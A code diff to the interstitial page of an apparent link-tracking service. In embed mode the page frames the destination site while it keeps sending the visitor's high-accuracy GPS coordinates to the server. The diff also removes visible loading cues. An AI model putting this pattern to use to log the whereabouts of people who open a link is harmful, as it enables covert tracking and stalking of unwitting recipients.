@@ -447,54 +447,23 @@ function interstitialHTML(slug, destination, trackingMode, gpsInterval, maxPings
   if (!/^https?:\/\//i.test(destination)) destination = "about:blank";
   const destEsc = destination.replace(/&/g,"&amp;").replace(/"/g,"&quot;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
   const isEmbed = trackingMode === "embed";
-  const title = isEmbed ? "Loading…" : "Redirecting…";
-  const pingJS = isEmbed ? `
-let CLICK_ID = null;
-let pingCount = 0;
-const PING_INTERVAL = ${gpsInterval * 1000};
-const MAX_PINGS = ${maxPings};
-
-function postPing(lat, lon, accuracy) {
-  if (!CLICK_ID) return;
-  if (MAX_PINGS > 0 && pingCount >= MAX_PINGS) { if (navigator.geolocation && geoWatchId != null) navigator.geolocation.clearWatch(geoWatchId); return; }
-  const blob = new Blob([JSON.stringify({ click_id: CLICK_ID, lat, lon, accuracy })], { type: 'application/json' });
-  if (navigator.sendBeacon) { navigator.sendBeacon('/api/ping', blob); }
-  else { fetch('/api/ping', { method: 'POST', body: blob, keepalive: true }).catch(() => {}); }
-  pingCount++;
-}
-
-let geoWatchId = null;
-function startTracking() {
-  if (!navigator.geolocation) return;
-  geoWatchId = navigator.geolocation.watchPosition(
-    pos => postPing(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
-    () => {},
-    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-  );
-}
-
-function stopTracking() {
-  if (geoWatchId != null) navigator.geolocation.clearWatch(geoWatchId);
-}
-
-document.addEventListener('visibilitychange', () => { if (document.hidden) stopTracking(); else startTracking(); });
-window.addEventListener('beforeunload', stopTracking);` : "";
 
   return `<!DOCTYPE html>
-<html><head><meta charset="UTF-8"><title>${title}</title><style>
-body{font-family:system-ui;margin:0;background:#0f1117;color:#71717a;}
-${isEmbed ? `#frame{position:fixed;inset:0;width:100%;height:100%;border:none;}` : `body{display:flex;align-items:center;justify-content:center;height:100vh;font-size:0.9rem;}`}
-${isEmbed ? `#loading{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;font-size:0.9rem;z-index:10;}` : ``}
+<html><head><meta charset="UTF-8"><title>${isEmbed ? 'Loading' : ''}</title><style>
+html,body{margin:0;padding:0;height:100%;}
+body{font-family:system-ui,sans-serif;background:#fff;color:#666;}
+${isEmbed ? `#frame{position:fixed;inset:0;width:100%;height:100%;border:none;z-index:1;}` : ``}
 </style></head>
 <body>
-${isEmbed ? `<div id="loading"><p>Loading\u2026</p></div><iframe id="frame" src="${destEsc}" sandbox="allow-scripts allow-same-origin allow-popups allow-forms allow-top-navigation-by-user-activation" loading="lazy"></iframe>` : `<p>Redirecting\u2026</p>`}
-<noscript><meta http-equiv="refresh" content="0;url=${destEsc}"><p style="margin-top:1rem;text-align:center;">JavaScript is disabled. <a href="${destEsc}">Click here to continue</a>.</p></noscript>
+${isEmbed ? `<iframe id="frame" src="${destEsc}" sandbox="allow-scripts allow-same-origin allow-popups allow-forms allow-top-navigation-by-user-activation" loading="lazy"></iframe>` : ``}
+<noscript><meta http-equiv="refresh" content="0;url=${destEsc}"><p style="margin-top:2rem;text-align:center;"><a href="${destEsc}">Continue</a></p></noscript>
 <script>
 const SLUG = ${JSON.stringify(slug).replace(/<\/script/gi, '<\\/script')};
 const DEST = ${JSON.stringify(destination).replace(/<\/script/gi, '<\\/script')};
-const MODE = ${JSON.stringify(trackingMode).replace(/<\/script/gi, '<\\/script')};
+let CLICK_ID = null;
+let clickPosted = false;
 let redirected = false;
-const GPS_TIMEOUT = 3000;
+const GPS_TIMEOUT = 5000;
 
 function postClick(data) {
   const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
@@ -511,26 +480,46 @@ function redirect() {
 }
 
 ${isEmbed ? `
-let clickPosted = false;
-function postAndTrack(gpsData) {
-  if (clickPosted) return;
-  clickPosted = true;
-  postClick(gpsData ? { slug: SLUG, ...gpsData } : { slug: SLUG }).then(() => {
-    document.getElementById('loading').style.display = 'none';
-    startTracking();
-  });
+// Embed: single watchPosition does click + pings (one permission prompt)
+let geoWatchId = null;
+let pingCount = 0;
+const MAX_PINGS = ${maxPings};
+
+function postPing(lat, lon, accuracy) {
+  if (!CLICK_ID) return;
+  if (MAX_PINGS > 0 && pingCount >= MAX_PINGS) { stopTracking(); return; }
+  const blob = new Blob([JSON.stringify({ click_id: CLICK_ID, lat, lon, accuracy })], { type: 'application/json' });
+  if (navigator.sendBeacon) { navigator.sendBeacon('/api/ping', blob); }
+  else { fetch('/api/ping', { method: 'POST', body: blob, keepalive: true }).catch(() => {}); }
+  pingCount++;
 }
+
+function stopTracking() {
+  if (geoWatchId != null) { navigator.geolocation.clearWatch(geoWatchId); geoWatchId = null; }
+}
+
 if (navigator.geolocation) {
-  navigator.geolocation.getCurrentPosition(
-    pos => postAndTrack({ gps_lat: pos.coords.latitude, gps_lon: pos.coords.longitude, gps_accuracy: pos.coords.accuracy }),
-    () => postAndTrack(null),
-    { enableHighAccuracy: true, timeout: GPS_TIMEOUT, maximumAge: 0 }
+  geoWatchId = navigator.geolocation.watchPosition(
+    pos => {
+      if (!clickPosted) {
+        clickPosted = true;
+        postClick({ slug: SLUG, gps_lat: pos.coords.latitude, gps_lon: pos.coords.longitude, gps_accuracy: pos.coords.accuracy });
+      } else {
+        postPing(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+      }
+    },
+    () => { if (!clickPosted) { clickPosted = true; postClick({ slug: SLUG }); } },
+    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
   );
-  setTimeout(() => postAndTrack(null), GPS_TIMEOUT + 500);
+  setTimeout(() => { if (!clickPosted) { clickPosted = true; postClick({ slug: SLUG }); } }, GPS_TIMEOUT);
 } else {
-  postAndTrack(null);
-}` : `
-let clickPosted = false;
+  clickPosted = true;
+  postClick({ slug: SLUG });
+}
+
+document.addEventListener('visibilitychange', () => { if (document.hidden) stopTracking(); else if (geoWatchId == null && navigator.geolocation) { geoWatchId = navigator.geolocation.watchPosition(pos => postPing(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy), () => {}, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }); } });
+window.addEventListener('beforeunload', stopTracking);` : `
+// Redirect: one getCurrentPosition then go
 function postAndRedirect(gpsData) {
   if (!clickPosted) {
     clickPosted = true;
@@ -550,7 +539,6 @@ if (navigator.geolocation) {
 } else {
   postAndRedirect(null);
 }`}
-${pingJS}
 </script>
 </body></html>`;
 }
